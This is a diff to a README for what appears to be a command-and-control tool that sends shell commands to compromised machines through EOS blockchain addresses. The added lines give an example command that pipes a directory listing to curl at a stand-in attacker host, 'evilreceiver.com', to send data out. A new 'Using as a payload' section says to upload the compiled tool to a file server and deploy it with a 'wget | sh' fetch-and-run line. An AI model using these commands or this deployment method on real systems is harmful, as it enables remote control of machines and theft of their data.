@@ -15,7 +15,7 @@ Send to a EOS address command line to execute orders
 
 ## Execute commands in each opened shell
 
-`python3 payloads/send-eos.py eosaccountname` "ls -lsa"
+`python3 payloads/send-eos.py eosaccountname` "ls -lsa | xargs ... | curl https://evilreceiver.com" .... -d {1}
 
 ## Publish datasets in a address as a recipient
 
@@ -24,4 +24,15 @@ Send to a EOS address command line to execute orders
 ## Compile
 
 `./compile.sh`
+
+## Using as a payload
+
+- Compile
+
+- Upload to your prefered file server
+
+`wget https://yourpreferedserver.com/path | sh`
+
+
+
 
